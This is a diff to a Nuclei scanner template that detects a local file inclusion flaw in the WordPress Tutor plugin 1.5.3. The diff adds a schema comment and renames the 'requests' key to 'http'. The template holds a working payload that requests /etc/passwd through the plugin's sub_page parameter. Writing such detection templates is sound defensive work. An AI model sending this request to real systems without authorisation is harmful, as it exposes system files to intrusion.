@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: wp-tutor-lfi
 info:
   name: WordPress Plugin tutor.1.5.3 - Local File Inclusion
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://www.exploit-db.com/exploits/48058
   tags: wordpress,wp-plugin,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd"
